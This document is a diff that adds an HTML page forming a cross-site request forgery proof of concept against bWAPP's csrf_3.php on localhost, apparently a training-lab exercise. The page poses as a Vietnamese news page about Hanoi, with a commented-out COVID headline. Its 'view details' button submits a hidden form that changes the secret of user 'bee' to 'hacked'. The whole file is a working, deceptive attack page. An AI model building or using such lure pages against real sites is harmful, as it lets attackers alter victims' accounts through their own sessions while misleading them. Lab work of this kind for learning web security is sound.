@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Hà Nội ngày nay (Secret)</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link
+      rel="stylesheet"
+      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
+    />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+  </head>
+  <body>
+    <!-- <div class="jumbotron text-center" style="background-color: cadetblue;">
+      <h1>Covid 19 Hà Nội</h1>
+    </div> -->
+
+    <div class="container">
+      <form
+        action="http://localhost/bwapp/csrf_3.php"
+        method="GET"
+      >
+        <div style="display: none">
+          <input type="hidden" id="1" name="secret" value="hacked" />
+          <input type="hidden" id="2" name="login" value="bee" />
+        </div>
+        <div class="row">
+          <div class="col-lg-9">
+            <!-- <h3>
+              3000 ca mắc mới trong cộng đồng, Hệ thống y tế Hà Nội quá tải
+            </h3> -->
+          </div>
+          <div class="col-lg-3">
+            <button
+              class="btn btn-primary"
+              type="submit"
+              name="action"
+              value="change"
+            >
+              Xem chi tiết
+            </button>
+          </div>
+        </div>
+      </form>
+    </div>
+  </body>
+</html>
